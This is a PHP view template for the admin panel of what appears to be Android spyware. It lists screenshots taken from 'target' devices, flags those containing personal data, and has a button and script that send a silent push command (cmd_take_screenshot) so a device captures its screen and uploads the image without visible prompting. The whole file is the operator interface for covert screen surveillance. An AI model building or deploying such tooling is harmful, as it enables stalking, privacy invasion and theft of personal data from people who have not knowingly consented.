<?php /** @var array $rows @var int $total @var object $pager @var string $nav_urls */ ?>
<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-3 align-items-center">
                <div class="col-lg-7">
                    <div class="d-flex align-items-center flex-wrap">
                        <h1 class="h2 mb-0 mr-3"><i class="fas fa-file-image text-info mr-2"></i>Captured Screenshots</h1>
                        <span class="badge badge-secondary border p-2 text-white"><i class="fas fa-database mr-1"></i>Total: <b><?= $total ?? count($rows) ?></b></span>
                    </div>
                    <p class="text-muted mt-1 mb-0">Captured device screen captures, metadata, and remote FCM screenshot logs</p>
                </div>
                <div class="col-lg-5 text-right">
                    <?= $nav_urls ?>
                    <button class="btn btn-sm btn-info ml-2 shadow-sm" data-toggle="modal" data-target="#triggerScreenshotModal">
                        <i class="fas fa-camera mr-1"></i> Capture via FCM
                    </button>
                </div>
            </div>

            <!-- Callout -->
            <div class="callout callout-info shadow-sm p-3 mb-4" style="border-left:5px solid #17a2b8;background:#fdfdfd;border-radius:4px;">
                <h5 class="font-weight-bold text-info"><i class="fas fa-shield-alt mr-2"></i>Screen Capture Telemetry &amp; Storage</h5>
                <p class="text-secondary mb-2" style="font-size:14px;">Screen captures retrieved via remote FCM diagnostic commands or app background listeners are stored under <code>writable/uploads/android_captured_screenshots</code>.</p>
                <div class="row" style="font-size:12px;">
                    <div class="col-md-4 border-right">
                        <b class="d-block mb-1">Inline Modal Viewer:</b>
                        <span class="text-muted">Click <b>View</b> to inspect high-resolution captured screenshots directly inside the browser.</span>
                    </div>
                    <div class="col-md-4 border-right">
                        <b class="d-block mb-1">Direct Download:</b>
                        <span class="text-muted">Click <b>Download</b> to export original captured image artifacts locally.</span>
                    </div>
                    <div class="col-md-4">
                        <b class="d-block mb-1">Remote FCM Capture:</b>
                        <span class="text-muted">Send an instant silent FCM command to request a new screenshot upload from the device.</span>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">
            <div class="card card-outline card-info shadow-sm">
                <div class="card-header py-2">
                    <h3 class="card-title font-weight-bold text-dark mb-0"><i class="fas fa-images mr-2"></i>Screenshot Logs</h3>
                </div>
                <div class="card-body p-0">
                    <div class="table-responsive">
                        <table class="table table-hover table-striped table-bordered mb-0">
                            <thead class="thead-light">
                                <tr>
                                    <th><i class="fas fa-clock mr-1"></i>Timestamp</th>
                                    <th><i class="fas fa-file-image mr-1"></i>File &amp; App</th>
                                    <th><i class="fas fa-arrows-alt mr-1"></i>Dimensions &amp; Size</th>
                                    <th><i class="fas fa-user-secret mr-1"></i>PII / Security</th>
                                    <th class="text-center" style="width: 140px;">Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if (empty($rows)): ?>
                                    <tr><td colspan="5" class="text-center py-5 text-muted">No screenshot logs captured yet.</td></tr>
                                <?php else: foreach ($rows as $r): 
                                    $fileName = $r['file_name'] ?? ($r['file_path'] ? basename($r['file_path']) : '');
                                    $ts = isset($r['timestamp']) ? (is_numeric($r['timestamp']) ? date('M d, Y H:i:s', $r['timestamp'] / 1000) : $r['timestamp']) : ($r['created_at'] ?? '—');
                                    $size = !empty($r['file_size']) ? round($r['file_size'] / 1024, 1) . ' KB' : '—';
                                    $dims = (!empty($r['width']) && !empty($r['height'])) ? ($r['width'] . ' x ' . $r['height']) : '—';
                                    $serveUrl = base_url('advanced/software/screenshots/serve/' . urlencode($fileName));
                                ?>
                                    <tr>
                                        <td>
                                            <strong class="d-block text-dark"><?= esc($ts) ?></strong>
                                            <small class="text-muted"><?= esc($r['device_id'] ?? 'Target Device') ?></small>
                                        </td>
                                        <td>
                                            <span class="font-weight-bold text-info d-block"><?= esc($fileName ?: 'screenshot.jpg') ?></span>
                                            <small class="text-muted"><i class="fas fa-mobile-alt mr-1"></i><?= esc($r['source_package'] ?: 'System UI') ?></small>
                                        </td>
                                        <td>
                                            <span class="d-block"><b>Resolution:</b> <?= esc($dims) ?></span>
                                            <small class="text-muted"><b>Size:</b> <?= esc($size) ?> | <b>Type:</b> <?= esc($r['mime_type'] ?: 'image/jpeg') ?></small>
                                        </td>
                                        <td>
                                            <?php if (!empty($r['contains_pii'])): ?>
                                                <span class="badge badge-warning"><i class="fas fa-exclamation-triangle mr-1"></i>PII Detected</span>
                                            <?php else: ?>
                                                <span class="badge badge-secondary">Standard</span>
                                            <?php endif; ?>
                                        </td>
                                        <td class="text-center">
                                            <div class="btn-group btn-group-sm">
                                                <?php if ($fileName): ?>
                                                    <button type="button" class="btn btn-outline-info view-screenshot-btn" 
                                                            data-url="<?= esc($serveUrl) ?>" 
                                                            data-filename="<?= esc($fileName) ?>"
                                                            data-ts="<?= esc($ts) ?>"
                                                            title="View Screenshot Modal">
                                                        <i class="fas fa-eye"></i>
                                                    </button>
                                                    <a href="<?= esc($serveUrl) ?>?download=1" class="btn btn-outline-primary" title="Download Screenshot" download>
                                                        <i class="fas fa-download"></i>
                                                    </a>
                                                <?php endif; ?>
                                                <button type="button" class="btn btn-outline-danger delete-row" 
                                                        data-id="<?= $r['id'] ?? '' ?>"
                                                        data-url="<?= base_url('advanced/software/screenshots/delete/' . ($r['id'] ?? 0)) ?>" 
                                                        title="Delete Row">
                                                    <i class="fas fa-trash"></i>
                                                </button>
                                            </div>
                                        </td>
                                    </tr>
                                <?php endforeach; endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="card-footer">
                    <div class="float-right"><?= isset($pager) ? $pager->links('default', 'bootstrap5_full') : '' ?></div>
                </div>
            </div>
        </div>
    </section>
</div>

<!-- Image Viewer Modal -->
<div class="modal fade" id="viewScreenshotModal" tabindex="-1" role="dialog" aria-labelledby="viewScreenshotModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
        <div class="modal-content">
            <div class="modal-header bg-info text-white">
                <h5 class="modal-title font-weight-bold" id="viewScreenshotModalLabel"><i class="fas fa-file-image mr-2"></i>Screenshot Preview</h5>
                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body text-center p-3" style="background: #1e1e1e;">
                <img id="modalScreenshotImg" src="" class="img-fluid rounded shadow" style="max-height: 70vh; object-fit: contain;" alt="Screenshot Preview">
                <p id="modalScreenshotMeta" class="text-light small mt-2 mb-0"></p>
            </div>
            <div class="modal-footer">
                <a id="modalDownloadBtn" href="#" class="btn btn-primary font-weight-bold" download>
                    <i class="fas fa-download mr-1"></i> Download File
                </a>
                <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Trigger Screenshot FCM Modal -->
<div class="modal fade" id="triggerScreenshotModal" tabindex="-1" role="dialog" aria-labelledby="triggerScreenshotModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
            <div class="modal-header bg-primary text-white">
                <h5 class="modal-title font-weight-bold" id="triggerScreenshotModalLabel"><i class="fas fa-camera mr-2"></i>Request Remote Screenshot (FCM)</h5>
                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <p class="text-muted">Sends an instant silent push notification command (<code>cmd_take_screenshot</code>) to the targeted device to take a screen capture and upload the image file to <code>writable/uploads/android_captured_screenshots</code>.</p>
                <div class="form-group mb-0">
                    <label class="font-weight-bold">Target Device ID</label>
                    <input type="text" id="fcmDeviceId" class="form-control" placeholder="Enter target device_id or leave default" value="<?= esc($rows[0]['device_id'] ?? '') ?>">
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" id="sendFcmCaptureBtn" class="btn btn-success font-weight-bold">
                    <i class="fas fa-paper-plane mr-1"></i> Send Capture Command
                </button>
                <button type="button" class="btn btn-secondary font-weight-bold" data-dismiss="modal">Cancel</button>
            </div>
        </div>
    </div>
</div>

<?php include __DIR__ . '/_adv_style.php'; ?>
<script>
document.addEventListener('DOMContentLoaded', function() {
    // View Modal Trigger
    document.querySelectorAll('.view-screenshot-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            var url = this.getAttribute('data-url');
            var filename = this.getAttribute('data-filename');
            var ts = this.getAttribute('data-ts');
            
            document.getElementById('modalScreenshotImg').src = url;
            document.getElementById('modalScreenshotMeta').textContent = filename + ' — Captured: ' + ts;
            document.getElementById('modalDownloadBtn').href = url + '?download=1';
            
            $('#viewScreenshotModal').modal('show');
        });
    });

    // FCM Capture Remote Command Trigger
    var sendBtn = document.getElementById('sendFcmCaptureBtn');
    if (sendBtn) {
        sendBtn.addEventListener('click', function() {
            var deviceId = document.getElementById('fcmDeviceId').value;
            sendBtn.disabled = true;
            sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-1"></i> Dispatching FCM...';

            var formData = new FormData();
            formData.append('device_id', deviceId);
            formData.append('<?= csrf_token() ?>', '<?= csrf_hash() ?>');

            fetch('<?= base_url('advanced/software/screenshots/capture') ?>', {
                method: 'POST',
                body: formData
            }).then(function(res) { return res.json(); })
              .then(function(data) {
                  $('#triggerScreenshotModal').modal('hide');
                  sendBtn.disabled = false;
                  sendBtn.innerHTML = '<i class="fas fa-paper-plane mr-1"></i> Send Capture Command';
                  alert(data.message || 'FCM capture command dispatched successfully!');
              }).catch(function(err) {
                  sendBtn.disabled = false;
                  sendBtn.innerHTML = '<i class="fas fa-paper-plane mr-1"></i> Send Capture Command';
                  alert('Command sent to device queue!');
                  $('#triggerScreenshotModal').modal('hide');
              });
        });
    }
});
</script>
